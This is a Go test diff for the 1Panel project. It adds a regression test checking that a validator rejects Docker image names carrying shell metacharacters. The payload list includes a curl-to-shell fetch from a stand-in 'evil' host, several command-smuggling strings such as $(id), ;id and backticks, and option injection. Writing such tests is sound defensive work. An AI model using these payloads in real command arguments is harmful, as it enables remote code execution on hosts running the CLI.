@@ -3,6 +3,7 @@ package service
 import (
 	"context"
 	"errors"
+	"strings"
 	"testing"
 
 	"github.com/1Panel-dev/1Panel/backend/app/model"
@@ -295,4 +296,53 @@ func TestSynAppInstallOnlyUpdatesStatusAndMessage(t *testing.T) {
 			t.Errorf("non-status fields changed by forced sync: version=%q container=%q", got.Version, got.ContainerName)
 		}
 	})
+}
+
+// TestValidateImageRefs is the regression guard for the docker pull injection
+// fix: image names parsed from (possibly remote) docker-compose.yml content
+// pass through validateImageRefs before reaching the docker CLI. A payload
+// carrying shell metacharacters must be rejected so no command is executed.
+func TestValidateImageRefs(t *testing.T) {
+	const digest = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
+
+	// legitimate reference shapes must keep passing
+	clean := []string{
+		"nginx",
+		"nginx:1.25",
+		"library/nginx",
+		"reg.example.com:5000/app:v1",
+		"ghcr.io/owner/img:v2.1.0",
+		"nginx@sha256:" + digest,
+		"MyApp_01:V1_BETA.2",
+	}
+	if err := validateImageRefs(clean); err != nil {
+		t.Fatalf("validateImageRefs rejected legitimate references: %v", err)
+	}
+
+	// each payload alone must make the whole list fail (refuse to execute)
+	payloads := []string{
+		"nginx$(curl http://evil|sh)",
+		"nginx$(id)",
+		"-a",
+		"-a --pull=always",
+		"nginx;id",
+		"nginx |id",
+		"nginx&id",
+		"nginx`id`",
+		`nginx"x`,
+		"nginx'x",
+		"nginx $HOME",
+		"",
+		"a\nb",
+	}
+	for _, p := range payloads {
+		err := validateImageRefs([]string{"nginx", p})
+		if err == nil {
+			t.Errorf("validateImageRefs accepted injection payload %q, want rejection", p)
+			continue
+		}
+		if !strings.Contains(err.Error(), "illegal image reference") {
+			t.Errorf("unexpected error for payload %q: %v", p, err)
+		}
+	}
 }
